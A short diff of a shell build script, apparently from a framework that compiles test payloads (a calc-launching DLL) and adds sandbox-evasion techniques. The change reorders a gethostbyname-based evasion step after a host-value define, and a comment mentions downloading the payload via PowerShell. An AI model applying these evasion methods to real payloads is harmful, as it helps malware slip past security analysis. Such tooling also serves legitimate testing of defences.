@@ -36,8 +36,8 @@ $win32_compiler test_payloads/exec_calc.c -shared -o output/exec_calc.dll
 
 # add evasion techniques
 add_evasion fopen_sandbox_evasion
-add_evasion gethostbyname_sandbox_evasion
 printf "\n#define HOSTVALUE \"this.that\"" >> source/evasion/evasion.include
+add_evasion gethostbyname_sandbox_evasion
 reset_evasion_technique_counter
 
 # payload will be downloaded from HTTP source via powershell
